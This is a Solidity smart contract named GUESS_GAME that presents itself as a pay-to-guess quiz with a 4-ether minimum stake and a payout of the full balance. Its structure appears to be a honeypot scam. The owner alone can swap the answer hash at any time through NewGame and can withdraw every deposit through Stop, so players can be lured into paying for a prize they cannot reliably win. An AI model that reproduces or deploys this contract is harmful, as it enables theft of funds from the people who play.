1 pragma solidity ^0.4.25;
2 
3 contract GUESS_GAME
4 {
5     string public Question;
6     address questionSender;
7     bytes32 responseHash;
8 
9     function Play(string resp) public payable {
10         require(msg.sender == tx.origin);
11         if (responseHash == keccak256(resp) && msg.value >= 4 ether) {
12             msg.sender.transfer(address(this).balance);
13         }
14     }
15 
16     function() public payable{}
17  
18     function Setup(string q, string resp) public payable {
19         if (responseHash == 0x0) {
20             responseHash = keccak256(resp);
21             Question = q;
22             questionSender = msg.sender;
23         }
24     }
25     
26     function Stop() public payable {
27        require(msg.sender==questionSender);
28        msg.sender.transfer(address(this).balance);
29     }
30     
31     function NewGame(string q, bytes32 respHash) public payable {
32         require(msg.sender==questionSender);
33         Question = q;
34         responseHash = respHash;
35     }
36 }